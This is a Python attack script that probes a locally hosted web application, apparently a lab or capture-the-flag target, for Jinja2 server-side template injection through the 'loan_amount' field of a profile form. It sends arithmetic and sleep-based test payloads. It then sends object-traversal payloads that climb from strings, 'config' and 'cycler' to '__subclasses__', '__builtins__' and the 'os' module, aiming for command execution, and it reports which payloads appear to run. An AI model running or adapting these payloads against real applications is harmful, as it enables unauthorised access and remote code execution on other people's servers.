import requests
import time
import re

# Configuration
base_url = "http://127.0.0.1:32813"
target_url = f"{base_url}/profile"
login_url = f"{base_url}/login"

# Create session and authenticate
session = requests.Session()
print("[*] Authenticating and testing for SSTI execution evidence...")

try:
    # Login
    login_response = session.post(login_url, data={'username': 'test', 'password': 'test'}, allow_redirects=True)
    print(f"[+] Login status: {login_response.status_code}")
    if session.cookies:
        print(f"[+] Session cookies: {dict(session.cookies)}")
except Exception as e:
    print(f"[-] Login error: {e}")

# Get baseline profile page
print("\n[*] Getting baseline profile page...")
baseline = session.get(target_url)
print(f"[+] Baseline status: {baseline.status_code} | Length: {len(baseline.content)}B")
baseline_text = baseline.text

# Check baseline for template syntax indicators
print("\n[*] Analyzing baseline for template indicators...")
if '{{' in baseline_text or '{%' in baseline_text:
    print("[!] WARNING: Template delimiters found in baseline - possible WAF/filtering")
    
# Look for dynamic content areas
loan_amount_patterns = re.findall(r'loan[^>]*amount[^:]*:\s*([^<\s]+)', baseline_text, re.I)
if loan_amount_patterns:
    print(f"[+] Found loan amount field in baseline: {loan_amount_patterns[:3]}")

# Test payloads that would produce visible output if executed
visible_test_payloads = [
    # Mathematical expressions
    ("math1", "{{ 7*7 }}", "49"),
    ("math2", "{{ 2+2 }}", "4"),
    
    # String operations
    ("str1", "{{ 'test' }}", "test"),
    ("str2", "{{ 'a'+'b' }}", "ab"),
    
    # Object access (safe)
    ("obj1", "{{ config.__class__.__name__ }}", None),  # Should show class name
    ("obj2", "{{ ''.__class__.__name__ }}", "str"),
    
    # Built-in functions
    ("builtin1", "{{ range(3) }}", None),  # Should show range object
    
    # Time-based (may cause delay)
    ("time1", "{{ __import__('time').sleep(2) }}", None),  # 2 second delay
]

print(f"\n[*] Testing {len(visible_test_payloads)} payloads for visible execution...")

execution_evidence = []

for test_id, payload, expected in visible_test_payloads:
    print(f"\n--- {test_id}: {payload} ---")
    
    # Test in loan_amount field (primary target)
    post_data = {
        'name': 'TestUser',
        'lastname': 'TestLast',
        'email': 'test@example.com',
        'loan_amount': payload,
        'loan_term_months': '36',
        'monthly_payment': '0.0'
    }
    
    try:
        start_time = time.time()
        response = session.post(target_url, data=post_data)
        elapsed = time.time() - start_time
        
        print(f"[+] Status: {response.status_code} | Time: {elapsed:.2f}s | Length: {len(response.content)}B")
        
        # Check for time-based evidence
        if elapsed > 1.5 and 'sleep' in payload:
            print(f"[!] TIME DELAY DETECTED: {elapsed:.2f}s (expected ~2s)")
            execution_evidence.append(f"{test_id} - time delay")
        
        # Check if expected output appears
        if expected and expected in response.text:
            print(f"[!] EXECUTION CONFIRMED: Found expected output '{expected}'")
            execution_evidence.append(f"{test_id} - output match: {expected}")
        
        # Check for template evaluation artifacts
        if payload in response.text:
            print(f"[-] Payload appears verbatim - likely not executed")
        elif '{{' not in response.text and '{%' not in response.text:
            # Template syntax disappeared - possible execution
            print(f"[!] Template syntax removed - possible execution occurred")
            
            # Look for result indicators
            if test_id.startswith('math'):
                math_result = re.search(r'amount[^:>]*[:>]\s*([0-9]+)', response.text, re.I)
                if math_result:
                    result = math_result.group(1)
                    print(f"[?] Possible result in output: {result}")
                    if result == expected:
                        print(f"[!] CONFIRMED: Expected result '{expected}' found in output!")
                        execution_evidence.append(f"{test_id} - calculated result: {result}")
            
        # Show sample of where loan amount appears
        loan_match = re.search(r'amount[^:>]*[:>]\s*([^<\s]{0,50})', response.text, re.I)
        if loan_match:
            print(f"[?] Loan amount shows: {loan_match.group(1)}")
        
        time.sleep(0.3)
        
    except Exception as e:
        print(f"[-] Error: {e}")

# Test for object traversal to find dangerous functions
print("\n" + "="*60)
print("TESTING FOR OBJECT TRAVERSAL TO OS/SUBPROCESS")
print("="*60)

dangerous_payloads = [
    # Try to access __subclasses__ to find subprocess.Popen
    ("subclass1", "{{ ''.__class__.__mro__[2].__subclasses__() }}", "list"),
    
    # Try to get class count
    ("subclass2", "{{ len(''.__class__.__mro__[2].__subclasses__()) }}", None),
    
    # Try to access os via config
    ("os1", "{{ config.__class__.__init__.__globals__['os'] }}", "module"),
    
    # Try to access __builtins__
    ("builtin1", "{{ config.__class__.__init__.__globals__['__builtins__'] }}", "dict"),
    
    # Try cycler object (Jinja2 built-in)
    ("cycler1", "{{ cycler.__init__.__globals__ }}", None),
]

for test_id, payload, expected_type in dangerous_payloads:
    print(f"\n--- {test_id}: {payload[:60]}... ---")
    
    post_data = {
        'name': 'TestUser',
        'lastname': 'TestLast',
        'email': 'test@example.com',
        'loan_amount': payload,
        'loan_term_months': '36',
        'monthly_payment': '0.0'
    }
    
    try:
        response = session.post(target_url, data=post_data)
        print(f"[+] Status: {response.status_code} | Length: {len(response.content)}B")
        
        # Check response for execution signs
        if 'subclasses__' in response.text:
            print(f"[-] Payload reflected - likely filtered")
        elif 'object at' in response.text or 'list object' in response.text:
            print(f"[!] Possible object representation found")
            execution_evidence.append(f"{test_id} - object access")
        elif 'module' in response.text and expected_type == 'module':
            print(f"[!] Module object found - possible os access!")
            execution_evidence.append(f"{test_id} - module access")
        
        # Check loan amount field specifically
        loan_match = re.search(r'class="form-control"[^>]*value="([^"]*)"', response.text)
        if loan_match and loan_match.group(1) != payload:
            print(f"[!] Field content changed: {loan_match.group(1)[:50]}...")
        
        time.sleep(0.3)
        
    except Exception as e:
        print(f"[-] Error: {e}")

# Final analysis
print("\n" + "="*70)
print("FINAL ANALYSIS - SSTI Execution Evidence")
print("="*70)

if execution_evidence:
    print(f"[+] Found {len(execution_evidence)} indicators of template execution:")
    for evidence in execution_evidence:
        print(f"  - {evidence}")
    print("\n[!] SSTI is likely working - template expressions are being evaluated")
else:
    print("[-] No clear evidence of SSTI execution detected")
    print("\nPossible reasons:")
    print("  1. No SSTI vulnerability exists")
    print("  2. Payloads are being filtered/sanitized")
    print("  3. Template engine is sandboxed")
    print("  4. Execution doesn't reflect in response (blind SSTI)")

print(f"\n[*] Tested {len(visible_test_payloads) + len(dangerous_payloads)} total payloads")
